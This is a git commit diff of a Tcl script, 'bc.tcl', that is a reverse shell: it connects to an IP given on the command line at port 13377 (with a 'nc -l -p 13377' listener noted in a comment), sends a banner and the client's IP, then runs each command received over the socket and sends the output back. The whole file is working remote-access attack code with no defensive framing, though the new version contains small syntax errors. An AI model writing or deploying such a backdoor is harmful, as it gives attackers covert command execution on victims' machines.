25701f5210163b92f837bd2c2a50dcb781c50088
Realz Code <114070103+realzcode@users.noreply.github.com>
2023-08-12 15:09:23 +0700

    😎

--- bc.tcl
+++ bc.tcl
@@ -1,35 +1,39 @@
-set asciiArt {
-  _____            _      _____          _
- |  __ \          | |    / ____|        | |
- | |__) |___  __ _| |___| |     ___   __| | ___
+set we {  _____            _      _____          _      
+ |  __ \          | |    / ____|        | |     
+ | |__) |___  __ _| |___| |     ___   __| | ___ 
  |  _  // _ \/ _` | |_  / |    / _ \ / _` |/ _ \
  | | \ \  __/ (_| | |/ /| |___| (_) | (_| |  __/
- |_|  \_\___|\__,_|_/___|\_____\___/ \__,_|\___|
+ |_|  \_\___|\__,_|_/___|\_____\\___/ \__,_|\___|
 }
 
-set po 13377 # nc -l -p 13377
+set po 13377 // nc -l -p 13377
 
-if {[llength $argv] < 2} {
+set args [lindex $argv 0]
+if {[llength $args] < 1} {
     puts "Please provide the IP address as a command-line argument."
     exit 1
 }
 
-set ip [lindex $argv 0]
-
-set clientIP [exec ipconfig | grep "IPv4 Address" | awk -F ": " {print $2}]
-
+set ip [lindex $args 0]
 set sock [socket $ip $po]
+set clientIP [lindex [exec nslookup [lindex [fconfigure $sock -sockname] 0]] 4]
 
-if {[catch {puts $sock $asciiArt}] == 0} {
-    while {[catch {read $sock line}] == 0} {
-        puts "Received: $line"
+puts -nonewline $sock $we
+puts $sock "\nClient IP: $clientIP"
 
-        if {$line == "exit"} {
-            close $sock
-            exit
-        } else {
-            set output [exec {*}[auto_execok cmd] /c $line 2>@1]
-            puts $sock $output
-        }
+while {1} {
+    puts -nonewline $sock "\n\$ "
+    flush $sock
+
+    set cmd [gets $sock]
+    if {$cmd eq "exit"} {
+        close $sock
+        exit 0
     }
+
+    set fp [open "| $cmd r"]
+    while {[gets $fp line] >= 0} {
+        puts -nonewline $sock $line
+    }
+    close $fp
 }
